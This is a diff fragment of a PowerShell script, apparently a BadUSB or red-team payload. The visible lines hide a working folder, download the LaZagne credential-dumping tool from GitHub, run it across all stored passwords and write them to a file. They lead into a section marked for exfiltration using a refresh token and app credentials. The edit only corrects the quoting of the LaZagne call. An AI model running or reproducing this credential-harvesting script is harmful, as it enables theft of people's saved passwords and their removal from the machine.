@@ -79,7 +79,7 @@ $hide.attributes='Hidden'
 
 #lazagne
 Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "$dir\lazagne.exe"
-& "$dir\lazagne.exe -v" all > "$dir\output.txt"
+& "$dir\lazagne.exe" all > "$dir\output.txt"
 
 #Exfil----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Define your refresh token and app credentials
